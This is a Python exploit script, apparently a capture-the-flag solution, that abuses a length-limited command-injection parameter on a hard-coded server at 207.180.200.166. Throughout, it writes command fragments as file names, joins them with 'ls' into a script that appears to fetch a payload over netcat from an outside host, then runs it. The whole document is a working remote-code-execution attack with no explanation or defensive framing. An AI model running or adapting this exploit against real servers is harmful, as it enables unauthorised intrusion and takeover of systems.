import requests

url = "http://207.180.200.166:8000/"

def cmd(c):
	requests.get(url, params={"cmd": c})

def reset():
	r = requests.get(url, params={"reset": 1})

def stage1():
	cmd(">nc")
	cmd(">23")
	cmd(">562")
	cmd(">220")
	cmd(">95")
	cmd(">999")
	cmd(">\>")
	cmd("ls>y")

def stage2():
	cmd(">2j!")
	cmd(">w")
	cmd("ls>z")
	cmd(">ex")
	cmd("*y<z")
	cmd(">1m2")
	cmd(">3\>")
	cmd(">4\>")
	cmd(">5m0")
	cmd(">6\>")
	cmd("ls>z")
	cmd("*y<z")

def stage3():
	cmd(">%j!")
	cmd(">%wq")
	cmd("ls>z")
	cmd("*y<z")

def get_payload():
	cmd("./y")
	cmd("y")

def execute_payload():
	cmd("./y")


reset()
print("[+] Finish Reset")
stage1()
print("[+] Finish Stage 1")
stage2()
print("[+] Finish Stage 2")
stage3()
print("[+] Finish Stage 3")
get_payload()
print("[+] Finish Store Payload")
execute_payload()
print("[+] Payload Executed")